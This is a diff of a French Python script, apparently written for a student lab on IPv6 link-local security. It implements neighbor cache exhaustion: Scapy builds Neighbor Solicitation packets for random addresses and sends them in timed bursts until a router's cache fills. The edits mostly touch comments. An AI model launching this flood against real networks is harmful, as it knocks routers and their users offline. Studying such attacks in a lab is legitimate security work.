@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 ns_flood.py — Saturation du cache de voisins (Neighbor Cache Exhaustion)
-Projet 10 — Sécurité du lien local IPv6 — Partie Feriel (1/3 "Attaques")
 
 Critère de réussite (CONTRAT.md §6) :
     le cache de voisins du ROUTEUR est plein, ou le ping échoue.
@@ -12,7 +11,7 @@ créer une entrée "INCOMPLETE" dans son cache de voisins en attendant une
 réponse qui ne viendra jamais (adresses inexistantes) -> le cache se remplit
 de déchets jusqu'à saturation (ou jusqu'à la limite du noyau, gc_thresh3).
 
-Étapes suivies (cf. planning Lina/Feriel) :
+Étapes suivies pour saturer le cache de voisins du routeur (cf. CONTRAT.md §6) :
   1. générer une plage d'adresses aléatoires dans le sous-réseau du routeur -> _generer_adresses_aleatoires
   2. construire et envoyer un NS par adresse, en rafale                      -> _envoyer_rafale
   3. fixer débit et durée pour comparer avant/après                         -> --debit / --duree
@@ -82,7 +81,7 @@ def construire_ns(mac_attaquant, cible_ip):
     """
     octets = ipaddress.IPv6Address(cible_ip).packed[-3:]
     multicast_dst = "ff02::1:ff%02x:%02x%02x" % (octets[0], octets[1], octets[2])
-    eth = Ether(src=mac_attaquant, dst="33:33:ff:%02x:%02x:%02x" % tuple(octets))
+    eth = Ether(src=mac_attaquant, dst="33:33:ff:%02x:%02x:%02x" % tuple(octets)) #33:33:xx:xx:xx:xx est la règle de conversion IPv6 multicast → MAC Ethernet (toujours ce préfixe 33:33)
     ip6 = IPv6(src="::", dst=multicast_dst)  # src=:: car on ne possède pas encore l'adresse (comme un vrai DAD/NS)
     ns = ICMPv6ND_NS(tgt=cible_ip)
     return eth / ip6 / ns
@@ -91,7 +90,7 @@ def construire_ns(mac_attaquant, cible_ip):
 def envoyer_rafale(iface, mac_attaquant, adresses, debit_par_s, dry_run):
     """Envoie un NS par adresse de la liste, en respectant approximativement
     `debit_par_s` paquets/seconde (pour pouvoir comparer des campagnes à
-    débit fixé, cf. planning étape 3).
+    débit fixé, étape 3).
     """
     intervalle = 1.0 / debit_par_s if debit_par_s > 0 else 0
     envoyes = 0
@@ -109,7 +108,7 @@ def envoyer_rafale(iface, mac_attaquant, adresses, debit_par_s, dry_run):
             time.sleep(intervalle)
     return envoyes
 
-
+ 
 def main():
     parser = base_arg_parser(
         "Saturation du cache de voisins IPv6 par flot de NS vers des adresses aléatoires."
@@ -126,7 +125,7 @@ def main():
                               "(typiquement l'adresse du routeur ou d'une victime).")
     args = parser.parse_args()
 
-    mac_attaquant = get_if_hwaddr(args.iface) if not args.dry_run else "02:00:00:00:00:66"
+    mac_attaquant = get_if_hwaddr(args.iface) if not args.dry_run else "02:00:00:00:00:66" 
 
     print(f"[*] Génération de {args.nb_adresses} adresses aléatoires dans {args.prefixe}...")
     adresses = generer_adresses_aleatoires(args.prefixe, args.nb_adresses)
